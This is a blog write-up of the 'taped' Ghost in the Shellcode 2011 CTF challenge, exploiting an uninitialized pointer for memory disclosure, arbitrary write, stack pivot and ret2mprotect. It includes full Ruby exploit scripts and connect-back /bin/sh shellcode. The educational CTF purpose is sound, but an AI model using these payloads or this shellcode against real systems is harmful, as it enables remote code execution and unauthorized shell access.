---
title: ShmoonCon Ghost in the Shellcode 2011
author: zoaedk
layout: post
categories:
  - General News
---
Just got back from ShmooCon and it seems that some people want a writeup for the taped challenge. I highly encourage you to try it yourself first, because once you see the bug, it takes away some of the fun.

<a href="http://ghostintheshellcode.com/challenges/taped-868340b903a76a95ceaa4ca49bf74a25" target="_self">Download taped</a>  
<!--more-->

## taped

### Finding the bug

Let&#8217;s get the basics out of the way: x86 ELF binary that runs on Linux. So, the bug we need is really small. It took me about two hours to find the bug, and it was only after I determined there were no other bugs that I found it. As such, there is no way to explain how to find the bug, but what I will do instead is give a couple hints, and then just tell you where it.

  1. Not a buffer overflow, not a format-string vulnerability.
  2. It is around the code that is used to choose a tape.
  3. It is in the function 0x08048F9F.
  4. Look at the code that handles the &#8216;previous page&#8217; command.
  5. The local variable that contains the previous page pointer is not initialized.

Okay, so now we see the bug: local variable not initialized. If you want to convince yourself of this, go to the choose tape screen and get to page 5. Now exit out of the choose tape screen, and then go back. You should be at page 1, as expected. Use the previous page command, p, and you should now be at page 4. Yay!

### Exploiting the bug (information disclosure)

The goal now is to control the previous page pointer so that after we give the previous page command at the tape choose screen, our pointer is used as the current page pointer.

There is only one place where we can send taped lots of data: set intro text command. This allows us to put 255 bytes on the stack. Now, are we going to be lucky enough for those bytes to not be overwritten before we get to the tape chooser?

If you try to go from the &#8220;set intro text&#8221; screen, exit out of the &#8220;queue management&#8221; screen, and then &#8220;choose active tape&#8221;, the applicable bytes will be overwritten. To be exact, they are overwritten in the &#8220;queue management&#8221; screen. There is another path though: &#8220;set intro text&#8221; screen -> &#8220;queue management&#8221; screen -> &#8220;add to queue&#8221; command -> &#8220;tape chooser&#8221; screen. Test this by sending 255 0x41&#8217;s, and the program will crash trying to dereference 0x41.

We now need to figure out a page pointer that points to a buffer we control. This will allow us to setup a valid page structure that points to our &#8220;tapes.&#8221; Quickly, let&#8217;s detail the structure of both pages and tapes.

<pre>struct page
{
  int id;
  int number_of_tapes;
  struct tape *tapes[];
};

struct tape
{
  int id;
  char *name;
  char intro_text[256];
};
</pre>

Looking at the code in 0x0804F62, we can see that number\_of\_tapes must be between 0 and 8, inclusive. Obviously, any pointers must point to valid memory.

At this point, it is obvious that we can do information disclosure using a custom name pointer. To do this, we need to construct a page structure and a tape structure. By using the intro text of a tape as our buffer, we will know the address of our custom structures. For simplicity, we will use the intro text of tape 1. The problem here is that the intro text buffer is filled using strcpy, but our structure will need multiple null bytes (e.g. number\_of\_tapes). The solution is to set the intro text multiple times, once for each null byte. For example, here is a payload that will print out address 0x0804b01c (the line is broken up to ease viewing):

<pre>3\n1\n1\n1\n2\n
3\n1\n\x41\x41\x41\x41\x1c\xb0\x04\x08\x01\xFF\xFF\xFF\x01\xFF\xFF\xFF\xc8\xb0\x04\x083\n
3\n1\n\x41\x41\x41\x41\x1c\xb0\x04\x08\x01\xFF\xFF\xFF\x01\xFF\xFF\x00\n
3\n1\n\x41\x41\x41\x41\x1c\xb0\x04\x08\x01\xFF\xFF\xFF\x01\xFF\x00\n
3\n1\n\x41\x41\x41\x41\x1c\xb0\x04\x08\x01\xFF\xFF\xFF\x01\x00\n
3\n1\n\x41\x41\x41\x41\x1c\xb0\x04\x08\x01\xFF\xFF\x00\n
3\n1\n\x41\x41\x41\x41\x1c\xb0\x04\x08\x01\xFF\x00\n
3\n1\n\x41\x41\x41\x41\x1c\xb0\x04\x08\x01\x00\n
3\n2\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBB\xd0\xb0\x04\x08\n1\np\n
</pre>

In the example, tape 1 is used to store the custom structures and tape 2 is used to setup the stack bytes. The address was chosen because it will contain the address of _\_libc\_start_main, which will allow us to bypass library address randomization.

### Exploiting the bug (code execution)

The next step is to turn this into a remote code execution vulnerability. Recall that the only way for us to give the program a reasonable amount of data, is from the &#8220;set intro text&#8221; screen. Also, recall that the intro text is stored inside of the tape structure. Now, since we control a page structure, we also control a list of pointers to tape structures. And since we are doing this from inside of the &#8220;add to queue&#8221; command, we can add an arbitrary address to the list of queued tapes. We pass the index of our tape in the queue to the &#8220;set intro text&#8221; command, and we can overwrite arbitrary memory provided that it contains a valid pointer for the name pointer.

Given that we can write to an arbitrary address, the natural target is the GOT. I attempted to overwrite the strcpy address, and while this will work, I knew it wasn&#8217;t sufficient due to NX bit. I needed a stack pivot to make this work. I was unable to quickly find a stack pivot that would work, so I tried something else.

I still wanted to do a stack pivot, since my preferred method to get around NX bit is to ret2mprotect. The only way to do this, though, required me to construct a custom stack. Kind of a chicken-and-egg problem. But, nothing stops our arbitrary memory write from writing to the stack, except for stack randomization. So, let&#8217;s assume we know the location of the stack and overwrite the stack. At this point, we can return to a &#8216;pop ebp; ret&#8217; and then to a &#8216;leave; ret&#8217;, and we have a stack pivot.

The obvious question at this point is why would we use a stack pivot when we can already write to a stack. Remember that when our arbitrary write vulnerability will use a strcpy, which means that our new stack can&#8217;t have null bytes. This is unreasonable. And, given that we know the location of the stack, we will know the location of the stack buffer that contains all 255 bytes we send to the program, including null bytes.

The new stack will look something like:

<pre><pre>[mprotect] [shellcode address] [mprotect arg1] [mprotect arg2] [mprotect arg3]</pre>


<p>
  The location of the shellcode doesn&#8217;t matter too much. It can be after the new stack, or it can be inside the intro text of a tape. It really doesn&#8217;t matter. As long as you know where it is located at run-time.
</p>


<p>
  Below is the applicable ruby code for overwriting the stack, doing a stack pivot, etc. Again, breaks are inserted to ease readability.
</p>


<pre>t = TCPSocket.new(host, port)
t.print "3\n1\n1\n1\n2\n1\n3\n3\n3\n"+shellcode+"\n"
t.print "3\n1\n\x41\x41\x41\x41\x78\x99\x04\x08\x01\xFF\xFF\xFF\x01\xFF\xFF\xFF"+return_addr+"\n"
t.print "3\n1\n\x41\x41\x41\x41\xa0\xb0\x04\x08\x01\xFF\xFF\xFF\x01\xFF\xFF\x00\n"
t.print "3\n1\n\x41\x41\x41\x41\xa0\xb0\x04\x08\x01\xFF\xFF\xFF\x01\xFF\x00\n"
t.print "3\n1\n\x41\x41\x41\x41\xa0\xb0\x04\x08\x01\xFF\xFF\xFF\x01\x00\n"
t.print "3\n1\n\x41\x41\x41\x41\xa0\xb0\x04\x08\x01\xFF\xFF\x00\n"
t.print "3\n1\n\x41\x41\x41\x41\xa0\xb0\x04\x08\x01\xFF\x00\n"
t.print "3\n1\n\x41\x41\x41\x41\x1c\xb0\x04\x08\x01\x00\n"
t.print "3\n2\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBB\xd0\xb0\x04\x08\n"
t.print "1\np\n10\n"
t.print "3\n4\n\xa8\x98\x04\x08"+buffer_addr+"\xac\x94\x04\x08DDDDEEEE"+mprotect+"\xd8\xb2\x04\x08\x00\xb0\x04\x08\x00\x10\x00\x00\x07\x00\x00\x00\n"
sleep 2
t.close
</pre>


<p>
  The basic overview of the above code: put shellcode in intro text, create custom page structure, setup stack with pointer to page structure, add <em>return_addr</em> pointer to the queue, and finally overwrite the stack by setting intro text.
</p>


<p>
  Yay, we are done! &#8230; Except the small details of the mprotect, return_addr, and buffer_addr. The mprotect address is easy to find using the information disclosure example above. The return_addr and buffer_addr are a constant offset from each other, so once we find one, we have the other, but how do we find the location of the stack?
</p>


<h3>
  Finishing it up
</h3>


<p>
  So, how do we find the location of the stack without brute-forcing 16 or so bits of randomization?
</p>


<p>
  <em>A bit of full disclosure: <span style="text-decoration: line-through;">there is likely a much better method, hopefully somebody else will write it up.</span> After doing this write-up, I decided to find a better method and found one. However, before I post it, I want to see what ideas other people have.<br />
  </em>
</p>


<p>
  Trivia question: where is there a pointer, to the stack, in the libc address space?
</p>


<p>
  After dumping the memory of the taped process, and searching a stack address, I found the answer. There is the &#8216;program_invocation_name&#8217; which will point to argv[0] (environ might work just as well). Okay, cool. We now know about where the stack is.
</p>


<p>
  However, on Linux, there is also some randomization between the program&#8217;s arguments (and environment variables) and the rest of the stack. To be precise, there is at most 8192 bytes inserted after the arguments and it is 16-byte aligned. This greatly reduces our need to brute-force.
</p>


<p>
  Since we can read arbitrary memory using the information disclosure and we know where the program&#8217;s arguments are, we can start reading at &#8216;program_invocation_name&#8217; and read every integer until we reach a return address of our choosing. In my example, I will use 0x08049809, since it doesn&#8217;t contain null bytes and is not in a library. The example is slightly optimized (it doesn&#8217;t read every integer).
</p>


<pre>count = 0
ret = 0
stack = program_name & 0xffffff00;
stack += 0xc;
until ret == 0x08049809
 stack -= 0x10
 t = TCPSocket.new(host, port)
 t.print "3\n1\n1\n1\n2\n"
 t.print "3\n1\n\x41\x41\x41\x41\x78\x99\x04\x08\x01\xFF\xFF\xFF\x01\xFF\xFF\xFF\xc8\xb0\x04\x08\n"
 t.print "3\n1\n\x41\x41\x41\x41\xa0\xb0\x04\x08\x01\xFF\xFF\xFF\x01\xFF\xFF\x00\n"
 t.print "3\n1\n\x41\x41\x41\x41\xa0\xb0\x04\x08\x01\xFF\xFF\xFF\x01\xFF\x00\n"
 t.print "3\n1\n\x41\x41\x41\x41\xa0\xb0\x04\x08\x01\xFF\xFF\xFF\x01\x00\n"
 t.print "3\n1\n\x41\x41\x41\x41\xa0\xb0\x04\x08\x01\xFF\xFF\x00\n"
 t.print "3\n1\n\x41\x41\x41\x41\xa0\xb0\x04\x08\x01\xFF\x00\n"
 t.print "3\n1\n\x41\x41\x41\x41"+[stack].pack("L")+"\x01\x00\n"
 t.print "3\n2\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBB\xd0\xb0\x04\x08\n"
 t.print "1\np\n"
 ret = (t.read 0xfaf)[-4,4].unpack("L")[0]
 t.close
 count += 1
end
</pre>


<p>
  I am going to gloss over how to find the address of mprotect. I used the same method as previously: ssh to find distribution, download libc package, find address of something exported by libc using information disclosure, and then use the downloaded libc to find that same thing and then mprotect.
</p>


<p>
  At this point, we are done. Things can probably be optimized a bit. I don&#8217;t really like the way that I get the stack address. And I believe that the stack pivot can be done without needing to know the stack address.
</p>


<p>
  Below is the complete ruby script that I wrote (for Debian). In the competition it didn&#8217;t work perfectly since the address of __libc_start_main contained a null byte, but that is easily fixed and probably is an issue only on Ubuntu.
</p>


<pre>#!/usr/bin/ruby

require 'socket'

host = "localhost"
port = 4240

t = TCPSocket.new(host, port)
t.print "3\n1\n1\n1\n2\n3\n1\n\x41\x41\x41\x41\x78\x99\x04\x08\x01\xFF\xFF\xFF\x01\xFF\xFF\xFF\xc8\xb0\x04\x083\n3\n1\n\x41\x
41\x41\x41\xa0\xb0\x04\x08\x01\xFF\xFF\xFF\x01\xFF\xFF\x00\n3\n1\n\x41\x41\x41\x41\xa0\xb0\x04\x08\x01\xFF\xFF\xFF\x01\xFF\x0
0\n3\n1\n\x41\x41\x41\x41\xa0\xb0\x04\x08\x01\xFF\xFF\xFF\x01\x00\n3\n1\n\x41\x41\x41\x41\xa0\xb0\x04\x08\x01\xFF\xFF\x00\n3\
n1\n\x41\x41\x41\x41\xa0\xb0\x04\x08\x01\xFF\x00\n3\n1\n\x41\x41\x41\x41"+"\x1c\xb0\x04\x08"+"\x01\x00\n3\n2\nAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBB\xd0\xb0
\x04\x08\n1\np\n"
libc_start_main = (t.read 0xfaf)[-4,4].unpack("L")[0]
print libc_start_main.to_s(16),"\n"
t.close

program_name_ptr = [(libc_start_main+0x138018)].pack("L") # 0x138018 is dependent on libc

t = TCPSocket.new(host, port)
t.print "3\n1\n1\n1\n2\n3\n1\n\x41\x41\x41\x41\x78\x99\x04\x08\x01\xFF\xFF\xFF\x01\xFF\xFF\xFF\xc8\xb0\x04\x083\n3\n1\n\x41\x
41\x41\x41\xa0\xb0\x04\x08\x01\xFF\xFF\xFF\x01\xFF\xFF\x00\n3\n1\n\x41\x41\x41\x41\xa0\xb0\x04\x08\x01\xFF\xFF\xFF\x01\xFF\x0
0\n3\n1\n\x41\x41\x41\x41\xa0\xb0\x04\x08\x01\xFF\xFF\xFF\x01\x00\n3\n1\n\x41\x41\x41\x41\xa0\xb0\x04\x08\x01\xFF\xFF\x00\n3\
n1\n\x41\x41\x41\x41\xa0\xb0\x04\x08\x01\xFF\x00\n3\n1\n\x41\x41\x41\x41"+program_name_ptr+"\x01\x00\n3\n2\nAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBB\xd0\xb0\x
04\x08\n1\np\n"
program_name = (t.read 0xfaf)[-4,4].unpack("L")[0]
print program_name.to_s(16),"\n"
t.close

count = 0
ret = 0
stack = program_name & 0xffffff00;
stack += 0xc;
until ret == 0x08049809
 stack -= 0x10
 t = TCPSocket.new(host, port)
 t.print "3\n1\n1\n1\n2\n3\n1\n\x41\x41\x41\x41\x78\x99\x04\x08\x01\xFF\xFF\xFF\x01\xFF\xFF\xFF\xc8\xb0\x04\x083\n3\n1\n\x41\x41\x41\x41\xa0\xb0\x04\x08\x01\xFF\xFF\xFF\x01\xFF\xFF\x00\n3\n1\n\x41\x41\x41\x41\xa0\xb0\x04\x08\x01\xFF\xFF\xFF\x01\xFF\x00\n3\n1\n\x41\x41\x41\x41\xa0\xb0\x04\x08\x01\xFF\xFF\xFF\x01\x00\n3\n1\n\x41\x41\x41\x41\xa0\xb0\x04\x08\x01\xFF\xFF\x00\n3\n1\n\x41\x41\x41\x41\xa0\xb0\x04\x08\x01\xFF\x00\n3\n1\n\x41\x41\x41\x41"+[stack].pack("L")+"\x01\x00\n3\n2\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBB\xd0\xb0\x04\x08\n1\np\n"
 ret = (t.read 0xfaf)[-4,4].unpack("L")[0]
 t.close
 count += 1
end

print stack.to_s(16), " in ", count.to_s, " tries.\n";
sleep 1

shellcode = "\x31\xc0\x6a\x01\x5b\x50\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x5b\x43\x5f\x68\x7e\xff\xfe\xff\x81\x04\x24\x01\x01\x01\x01\x68\x01\xff\x06\xad\x81\x04\x24\x01\x01\x01\x01\x6a\x10\x51\x50\x89\xe1\xb0\x66\xcd\x80\x5b\x31\xc9\x6a\x3f\x58\xcd\x80\x41\x80\xf9\x03\x75\xf5\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80\xeb\xfe";

return_addr = [(stack-0x70-0x8)].pack("L")
buffer_addr = [(stack-0x184+0x10)].pack("L")
mprotect = [(libc_start_main+0xC3978)].pack("L") # 0xC3978 is dependent on libc

t = TCPSocket.new(host, port)
t.print "3\n1\n1\n1\n2\n1\n3\n3\n3\n"+shellcode+"\n3\n1\n\x41\x41\x41\x41\x78\x99\x04\x08\x01\xFF\xFF\xFF\x01\xFF\xFF\xFF"+return_addr+"3\n3\n1\n\x41\x41\x41\x41\xa0\xb0\x04\x08\x01\xFF\xFF\xFF\x01\xFF\xFF\x00\n3\n1\n\x41\x41\x41\x41\xa0\xb0\x04\x08\x01\xFF\xFF\xFF\x01\xFF\x00\n3\n1\n\x41\x41\x41\x41\xa0\xb0\x04\x08\x01\xFF\xFF\xFF\x01\x00\n3\n1\n\x41\x41\x41\x41\xa0\xb0\x04\x08\x01\xFF\xFF\x00\n3\n1\n\x41\x41\x41\x41\xa0\xb0\x04\x08\x01\xFF\x00\n3\n1\n\x41\x41\x41\x41\x1c\xb0\x04\x08\x01\x00\n3\n2\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBB\xd0\xb0\x04\x08\n1\np\n10\n3\n4\n\xa8\x98\x04\x08"+buffer_addr+"\xac\x94\x04\x08DDDDEEEE"+mprotect+"\xd8\xb2\x04\x08\x00\xb0\x04\x08\x00\x10\x00\x00\x07\x00\x00\x00\n"
sleep 2
t.close
</pre>